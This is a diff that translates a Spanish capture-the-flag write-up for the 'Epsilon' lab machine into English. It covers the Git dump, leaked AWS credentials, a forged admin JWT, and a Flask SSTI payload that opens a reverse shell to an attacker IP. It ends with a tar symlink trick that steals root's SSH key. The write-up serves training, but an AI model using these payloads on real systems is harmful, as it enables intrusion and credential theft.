@@ -1,34 +1,34 @@
 <h2>Overview</h2>
-<p>Epsilon es una máquina Linux de dificultad media que expone un repositorio Git en el servidor web. Durante la enumeración se descubren credenciales de AWS Lambda filtradas en commits anteriores. Con estas credenciales, obtenemos la clave secreta utilizada para firmar JWTs en la aplicación Flask, lo que permite generar cookies de administrador y acceder a rutas protegidas. Finalmente, se obtiene acceso root explotando un cronjob que ejecuta <code>tar -h</code>, permitiendo reemplazar archivos críticos mediante enlaces simbólicos.</p>
+<p>Epsilon is a medium-difficulty Linux machine that exposes a Git repository on the web server. During enumeration, AWS Lambda credentials leaked in previous commits are discovered. Using these credentials, we obtain the secret key used to sign JWTs in the Flask application, allowing us to generate admin cookies and access protected routes. Finally, root access is obtained by exploiting a cronjob that runs <code>tar -h</code>, allowing critical files to be replaced via symbolic links.</p>
 
 <h2>Key steps</h2>
 <ol>
-  <li>Escaneo de puertos completo con <code>nmap</code>.</li>
-  <li>Escaneo detallado de los puertos abiertos para identificación de versiones y servicios.</li>
-  <li>Enumeración de la aplicación web y descarga del repositorio Git.</li>
-  <li>Revisión de commits antiguos para extraer credenciales de AWS Lambda.</li>
-  <li>Generación de un token JWT de administrador para acceso a rutas protegidas.</li>
-  <li>Explotación SSTI en Flask para obtener shell inicial.</li>
-  <li>Escalada de privilegios usando cronjob con <code>tar -h</code> y enlaces simbólicos.</li>
+  <li>Full port scan with <code>nmap</code>.</li>
+  <li>Detailed scanning of open ports to identify services and versions.</li>
+  <li>Enumeration of the web application and downloading the Git repository.</li>
+  <li>Review of old commits to extract AWS Lambda credentials.</li>
+  <li>Generation of an admin JWT token to access protected routes.</li>
+  <li>Exploitation of SSTI in Flask to obtain an initial shell.</li>
+  <li>Privilege escalation using a cronjob with <code>tar -h</code> and symbolic links.</li>
 </ol>
 
 <h3>1. Port enumeration</h3>
-<p>Primero identificamos los servicios expuestos en la máquina objetivo. Se realiza un escaneo SYN de todos los puertos TCP:</p>
+<p>First, we identify the services exposed on the target machine. A SYN scan of all TCP ports is performed:</p>
 
 <pre><code>sudo nmap -p- -sS --open --min-rate 5000 -n -vvv 10.10.11.134 -oN allPorts</code></pre>
 
-<p><strong>Resultados:</strong></p>
+<p><strong>Results:</strong></p>
 
 <pre><code>PORT     STATE  SERVICE
 22/tcp   open   ssh
 80/tcp   open   http
 5000/tcp open   upnp</code></pre>
 
-<p>Luego, realizamos un escaneo más detallado de los puertos abiertos para identificar versiones y servicios:</p>
+<p>Next, a more detailed scan of the open ports is done to identify versions and services:</p>
 
 <pre><code>sudo nmap -p22,80,5000 -sCV -n -vvv 10.10.11.134 -oN infoPorts</code></pre>
 
-<p><strong>Resultados con detección de versiones:</strong></p>
+<p><strong>Results with version detection (a .git repository is found):</strong></p>
 
 <pre><code>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
 80/tcp   open  http    Apache httpd 2.4.41
@@ -38,19 +38,19 @@
 |_http-title: Costume Shop</code></pre>
 
 <h3>2. HTTP enumeration and Git repository dump</h3>
-<p>Visitando <code>http://10.10.11.134</code> obtenemos un 403. Se comprueba si el repositorio Git está expuesto en <code>/.git</code> usando <code>gitdumper</code>:</p>
+<p>Visiting <code>http://10.10.11.134</code> returns a 403. We check if the Git repository is exposed at <code>/.git</code> using <code>gitdumper</code>:</p>
 
 <pre><code>./gitdumper.sh http://10.10.11.134/.git/ ~/CTF/Epsilon/loot/epsilon-repo</code></pre>
 
-<h4>Revisión de commits antiguos</h4>
-<p>Los archivos actuales no revelan credenciales, por lo que revisamos commits anteriores:</p>
+<h4>Review of old commits</h4>
+<p>The current files do not reveal credentials, so we check previous commits:</p>
 
 <pre><code>cd ~/CTF/Epsilon/loot/epsilon-repo
 git log --oneline --graph --all
 git log -p > ../commits_diff.txt
 cat ../commits_diff.txt</code></pre>
 
-<p>Se encuentran credenciales de AWS Lambda en un commit antiguo:</p>
+<p>AWS Lambda credentials are found in an old commit:</p>
 
 <pre><code>@@ -8,8 +8,8 @@ session = Session(
 -     aws_access_key_id='<aws_access_key_id>',
@@ -62,13 +62,13 @@ cat ../commits_diff.txt</code></pre>
 )</code></pre>
 
 <h3>3. AWS Lambda enumeration</h3>
-<p>Configuramos AWS CLI con las credenciales obtenidas:</p>
+<p>We configure the AWS CLI with the obtained credentials:</p>
 
 <pre><code>aws configure
-# aws_access_key_id y aws_secret_access_key
-# región: us-east-1</code></pre>
+# aws_access_key_id and aws_secret_access_key
+# region: us-east-1</code></pre>
 
-<p>Listamos funciones Lambda y descargamos el código:</p>
+<p>List Lambda functions and download the code:</p>
 
 <pre><code>aws --endpoint-url=http://cloud.epsilon.htb/ lambda list-functions
 aws --endpoint-url=http://cloud.epsilon.htb/ lambda get-function --function-name costume_shop_v1
@@ -76,42 +76,42 @@ wget http://cloud.epsilon.htb/path/to/code.zip
 unzip code.zip
 cat lambda_function.py</code></pre>
 
-<p>Se encuentra la <strong>clave secreta</strong> usada para firmar JWTs.</p>
+<p>The <strong>secret key</strong> used to sign JWTs is found.</p>
 
-<h3>4. Explotación y acceso inicial</h3>
-<p>Generamos un JWT de administrador usando PyJWT:</p>
+<h3>4. Exploitation and initial access</h3>
+<p>We generate an admin JWT using PyJWT:</p>
 
 <pre><code>import jwt
 secret = 'VALUE_EXTRACTED_FROM_LAMBDA'
 token = jwt.encode({"username":"admin"}, secret, algorithm="HS256")
 print(token)</code></pre>
 
-<p>Se coloca este token en la cookie <code>auth</code> para acceder a rutas administrativas:</p>
+<p>We place this token in the <code>auth</code> cookie to access admin routes:</p>
 
 <pre><code>curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.11.134/home</code></pre>
 
-<p>La misma cookie funciona para <code>http://epsilon.htb:5000/home</code>:</p>
+<p>The same cookie works for <code>http://epsilon.htb:5000/home</code>:</p>
 <img src="writeups/img/epsilon/img3.png" alt="Home inside the platform">
-<p>El bypass se confirma visualmente:</p>
+<p>The bypass is visually confirmed:</p>
 <img src="writeups/img/epsilon/img4.png" alt="Authenticated home view">
 
-<h4>SSTI en Flask</h4>
-<p>En <code>/order</code>, los campos son evaluados con <code>render_template_string</code>, permitiendo SSTI. Probamos:</p>
+<h4>SSTI in Flask</h4>
+<p>On <code>/order</code>, fields are evaluated with <code>render_template_string</code>, allowing SSTI. We test:</p>
 
 <pre><code>{{ 3*3 }}</code></pre>
 
-<p>Se obtiene <strong>9</strong>, confirmando la vulnerabilidad:</p>
+<p><strong>9</strong> is returned, confirming the vulnerability:</p>
 <img src="writeups/img/epsilon/img5.png" alt="SSTI test">
 
-<p>Para un reverse shell:</p>
+<p>For a reverse shell:</p>
 
 <pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.10.14.36\',6969));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\'/bin/bash\')"').read() }}</code></pre>
 
-<p>Se obtiene shell y el primer flag (<code>user.txt</code>):</p>
+<p>We obtain a shell and the first flag (<code>user.txt</code>):</p>
 <img src="writeups/img/epsilon/img6.png" alt="First flag obtained">
 
-<h3>5. Escalada de privilegios</h3>
-<p>Usando <code>pspy</code>, encontramos un cronjob que ejecuta <code>tar -h</code> cada 5 segundos:</p>
+<h3>5. Privilege escalation</h3>
+<p>Using <code>pspy</code>, we find a cronjob that runs <code>tar -h</code> every 5 seconds:</p>
 
 <pre><code>#!/bin/bash
 file=`date +%N`
@@ -123,7 +123,7 @@ check_file=`date +%N`
 /usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
 /usr/bin/rm -rf /opt/backups/*</code></pre>
 
-<p>Abusamos de <code>-h</code> para reemplazar archivos críticos mediante enlaces simbólicos:</p>
+<p>We abuse <code>-h</code> to replace critical files using symbolic links:</p>
 
 <pre><code>#!/bin/bash
 while true; do 
@@ -134,9 +134,9 @@ while true; do
     fi; 
 done</code></pre>
 
-<p>Cuando el cronjob vuelve a archivar con <code>-h</code>, la clave privada de root se copia a una ubicación accesible.</p>
+<p>When the cronjob archives again with <code>-h</code>, root's private key is copied to an accessible location.</p>
 
-<p>Ejemplo de extracción de <code>id_rsa</code>:</p>
+<p>Example of extracting <code>id_rsa</code>:</p>
 
 <pre><code>cd /tmp
 ./root.sh
@@ -145,11 +145,11 @@ cp 503891800.tar /tmp
 cd /tmp
 tar -xf 503891800.tar
 cd opt/backups
-cat checksum  # Contiene la id_rsa</code></pre>
+cat checksum  # Contains id_rsa</code></pre>
 
-<p>Finalmente, se conecta vía SSH como root:</p>
+<p>Finally, we SSH as root:</p>
 
 <pre><code>ssh -i id_rsa root@10.10.11.134</code></pre>
 
-<p>Se obtiene acceso completo a la máquina Epsilon.</p>
+<p>Full access to the Epsilon machine is obtained.</p>
 
